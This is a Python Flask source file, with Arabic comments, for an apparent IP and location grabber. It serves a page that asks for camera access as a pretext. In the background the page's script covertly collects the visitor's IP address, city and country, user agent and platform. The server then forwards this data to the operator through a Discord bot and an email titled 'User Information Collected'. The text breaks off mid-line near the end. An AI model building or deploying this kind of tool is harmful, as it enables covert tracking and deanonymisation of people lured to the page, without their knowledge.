from flask import Flask, render_template_string, request, jsonify
import requests
import discord
from discord.ext import commands
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

app = Flask(__name__)

# إعدادات البريد الإلكتروني
SENDER_EMAIL = 'your-email@gmail.com'  # بريدك الإلكتروني
SENDER_PASSWORD = 'your-email-password'  # كلمة المرور للبريد
RECIPIENT_EMAIL = 'recipient-email@example.com'  # البريد الإلكتروني الذي سيستقبل الرسالة

# إعدادات بوت Discord
DISCORD_BOT_TOKEN = 'your-discord-bot-token'
GUILD_ID = 'your-guild-id'  # ID السيرفر
CHANNEL_ID = 'your-channel-id'  # ID القناة

# إعدادات عميل Discord
intents = discord.Intents.default()
client = commands.Bot(command_prefix="!", intents=intents)

@app.route('/')
def index():
    return render_template_string("""
    <html>
    <head><title>Camera Access</title></head>
    <body>
    <h1>Please Allow Camera Access</h1>
    <video id="video" width="640" height="480" autoplay></video>
    <script>
    navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                document.getElementById("video").srcObject = stream;
                
                // بعد منح الإذن، جمع الـ IP والموقع
                fetch("https://api.ipify.org?format=json")
                    .then(response => response.json())
                    .then(data => {
                        var ip = data.ip;
                        getLocation(ip);
                    });

                function getLocation(ip) {
                    fetch(`https://ipapi.co/${ip}/json/`)
                        .then(response => response.json())
                        .then(locationData => {
                            var location = locationData.city + ', ' + locationData.country_name;
                            getDeviceInfo(ip, location);
                        });
                }

                // جمع معلومات الجهاز
                function getDeviceInfo(ip, location) {
                    var userAgent = navigator.userAgent;
                    var platform = navigator.platform;
                    var deviceInfo = {
                        ip: ip,
                        location: location,
                        userAgent: userAgent,
                        platform: platform
                    };
                    sendToServer(deviceInfo);
                }
                
                // إرسال البيانات إلى الخادم
                function sendToServer(deviceInfo) {
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/send_data", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.send(JSON.stringify(deviceInfo));
                }
            })
            .catch(function(err) {
                alert("Camera not found: " + err);
            });
    </script>
    </body>
    </html>
    """)

@app.route('/send_data', methods=['POST'])
def send_data():
    # استخراج المعلومات من الطلب
    data = request.get_json()
    ip = data['ip']
    location = data['location']
    userAgent = data['userAgent']
    platform = data['platform']
    
    # إنشاء رسالة تحتوي على جميع المعلومات
    message = f"IP: {ip}\nLocation: {location}\nUser Agent: {userAgent}\nPlatform: {platform}\nThe user has granted camera access."

    # إرسال البيانات إلى Discord عبر Bot
    send_to_discord(message)

    # إرسال البريد الإلكتروني تلقائيًا
    send_email(message)

    return jsonify({"message": "Data sent successfully!"}), 200

def send_to_discord(message):
    # إرسال الرسالة عبر بوت Discord
    channel = client.get_channel(int(CHANNEL_ID))  # استخدام ID القناة
    client.loop.create_task(channel.send(message))

def send_email(message):
    try:
        # إعداد البريد الإلكتروني
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = 'User Information Collected'

        # إضافة نص الرسالة
        msg.attach(MIMEText(message, 'plain'))

        # الاتصال بخادم SMTP (استخدام Gmail كمثال)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        text = msg.as_string()

        # إرسال البريد الإلكتروني
        server.sendmail(SENDER_EMAIL, RECIPIENT_EMAIL, text)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# تشغيل بوت Discord عند بدء التطبيق
@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

if __name__ == "__main__":
    # تشغيل الخادم Flask في Thread منفصل
    from threading import Thread
    def run_flask():
        app.run(host="0.
